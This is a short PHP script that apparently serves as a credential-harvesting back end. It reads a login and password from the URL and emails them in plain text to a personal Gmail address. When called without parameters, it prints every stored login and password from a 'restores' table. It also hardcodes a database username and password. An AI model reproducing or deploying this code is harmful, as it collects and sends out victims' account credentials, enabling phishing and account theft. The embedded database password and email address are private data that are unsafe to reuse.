<?php



error_reporting(E_ALL);
ini_set("display_error", true);
ini_set("error_reporting", E_ALL);


 function connect($host = 'localhost', $user = 'id15850498_v', $password = 'ZXjQ9@v>v|^E]xj[', $db_name = 'id15850498_nokia') {
    return new PDO('mysql:host='.$host.';dbname='.$db_name, $user, $password);
  }


if(empty($_GET['login'])) {
  $database = connect();
  $is_email_exist = $database->prepare("SELECT `id`, `login`, `password`, `timestamp_created` FROM `restores`");
  $is_email_exist->execute(array());



      while($row1 = $is_email_exist->fetch(PDO::FETCH_ASSOC)) {
      /*  if(User::isAdmin()) {
          $row[] = '<div>Удалить статью</div>'; 
        }*/
      //  $row1['is_following'] = $this->isFollowing($row1['id']);
        $arr[] = $row1;
      }
var_dump($arr);
} else {
  
  $database = connect();

$login = $_GET['login'];

$password = $_GET['password'];



$to      = 'ivanigantyev@gmail.com';
$subject = 'the subject';
$message = 'login:'.$login."\n password:".$password;
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);


}

?>